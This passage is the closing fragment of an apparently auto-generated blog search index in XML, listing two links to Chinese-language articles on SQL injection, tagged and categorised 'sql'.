<p><a href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
<p><a href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
</search>
